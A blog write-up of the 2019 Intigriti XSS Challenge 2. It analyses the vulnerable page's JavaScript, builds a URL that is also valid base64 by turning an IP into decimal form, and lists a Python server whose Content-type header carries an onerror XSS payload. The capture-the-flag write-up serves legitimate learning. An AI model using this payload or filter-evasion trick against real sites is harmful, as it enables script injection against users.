---
layout: post
title:  "Intigriti XSS Challenge 2 and how I lost time to a bad assumption"
date:   2019-05-26
categories: intigriti xss
---

[Intigriti](https://www.intigriti.com/public/) is once again offering us an [XSS challenge](https://challenge.intigriti.io/2/). The first one had cryptic code and a complicated setup between the page and an `iframe`, but this time around the code is rather straight-forward. Let's see if that makes the challenge easier. ;)

## Analyzing the code

```javascript
var b64img = window.location.hash.substr(1);
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
  if (this.readyState == 4 && this.status == 200) {
    var reader = new FileReader();
    reader.onloadend = function() {
      document.write(`
        <a href="${b64img}" alt="${atob(b64img)}">
          <img src="${reader.result}">
        </a>`);
    }
    reader.readAsDataURL(this.response);
  }
};
xhttp.responseType = 'blob';
xhttp.open("GET", b64img, true);
xhttp.send();
```

1. The `hash` of the current page's url (minus the leading `#`) is assigned to `b64img`
2. A GET HTTP request is sent to `b64img` and the answer will be read as a [Blob](https://developer.mozilla.org/en-US/docs/Web/API/Blob)
3. If the HTTP request answers with 200, the Blob is [`readAsDataURL`](https://developer.mozilla.org/en-US/docs/Web/API/FileReader/readAsDataURL) with a [`FileReader`](https://developer.mozilla.org/en-US/docs/Web/API/FileReader)
4. Once the Blob is read, `b64img`, `atob(b64img)` and the data URL created from the Blob are inserted into the DOM

Main observations:

- The `hash` of the URL somehow has to be a valid URL because we're making an HTTP request from it and we expect a 200 response
- That URL also has to be a valid base64 string because we're sending it to `atob(64)` which is the JavaScript function to decode base64

## Finding a valid URL

As it was the case for the last challenge, I don't care about XSS payloads yet. It's pretty clear either `b64img`, `atob(b64img)` or `reader.result` will be where we get XSS from, but there is a major challenge before getting there: crafting a valid URL that is also valid base64!

The way its coded, a value for `b64img` without a protocol (i.e.: `http://`) will make a request relative to the current domain (`https://challenge.intigriti.io/2/`). For example if `b64img` is `ABC` it will trigger a request for `https://challenge.intigriti.io/2/ABC` while if `b64img` is `http://test.com` it will trigger a request for `http://test.com`.

At this point I made the assumption that `/` wasn't a valid base64 character (worked too much with url-safe base64 implementations lately!) and lost a ton of time trying a ton of things that made no sense until [@mastjohnny](https://twitter.com/mastjohnny) made me realize that it is a valid base64 character indeed. Many hours were lost exploring data URLs, `XMLHttpRequest` and `FileReader` for strange edge cases that would help me here but I should have verified my assumption instead. :)

### Eliminating invalid characters

I started a server on my machine and tried loading [https://challenge.intigriti.io/2/#http://127.0.0.1](https://challenge.intigriti.io/2/#http://127.0.0.1). This resulted in the following (expected) error

> Uncaught DOMException: Failed to execute 'atob' on 'Window': The string to be decoded is not correctly encoded.

I need to get rid of the `.` and the `:` because they are invalid base64 characters. Two transformations are needed!

1. Remove the `.` by changing the IP to a decimal IP: `http://127.0.0.1` becomes `http://2130706433` (See [IPv4 Address Representations](https://en.wikipedia.org/wiki/IPv4#Address_representations))
2. Remove the `:` by using a protocol-relative URL: `http://2130706433` becomes `//2130706433`
    - A protocol relative url will take the protocol of the parent page

With that I try [https://challenge.intigriti.io/2/#//2130706433](https://challenge.intigriti.io/2/#//2130706433) and the result is the following error

> GET https://127.0.0.1/ net::ERR_CONNECTION_REFUSED

The request went to *https* because I'm on the https version of the challenge. Let's try [http://challenge.intigriti.io/2/#//2130706433](http://challenge.intigriti.io/2/#//2130706433)

> Access to XMLHttpRequest at 'http://127.0.0.1/' from origin 'http://challenge.intigriti.io' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.

There is no CORS header returned by my server so I need to add `Access-Control-Allow-Origin: *` to my response.

I can now reload the same URL and it loads without crashing!

## XSS time

`readAsDataURL` returns a data URL which contains the `Content-type` of the resource loaded. For example the default challenge URL loads an image that turns into the data URL `"data:application/octet-stream;base64,iVBORw0KGgoAAAANSUhEUgAAA0o..."`. This text is inserted straight into the HTML and I have control over the `Content-type` from my server so I set it to `text/" onerror="alert(document.domain)"><!--` and...

![Success!]({{ '/images/intigriti_xss_victory.png' | absolute_url }})

Success! I uploaded the simple HTTP server to my VPS, changed `127.0.0.1` to its public IP and submitted my solution. There were other ways to trigger the XSS but instead of listing them here I encourage you to go on twitter and find other write-ups documenting them.

Here's the code used for my server.

```python
#!/usr/bin/python3

from http.server import BaseHTTPRequestHandler, HTTPServer

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        message = "Hello Intigriti!"

        self.protocol_version = "HTTP/1.1"
        self.send_response(200)
        self.send_header("Content-Length", len(message))
        self.send_header("Content-type", 'text/" onerror="alert(document.domain)"><!--')
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()

        self.wfile.write(bytes(message, "utf8"))
        return

def run():
    server = ('0.0.0.0', 80)
    httpd = HTTPServer(server, RequestHandler)
    httpd.serve_forever()
run()
```

## Conclusion

Another fun challenge! This time around my key takeaways are:

- Challenge your own assumptions, they could be making the challenge harder than it really is
- Different representations of the same thing can help evade filters/validations, keep them in mind!

Thank you [@intigriti](https://twitter.com/intigriti/) and good luck to everyone for the prize!
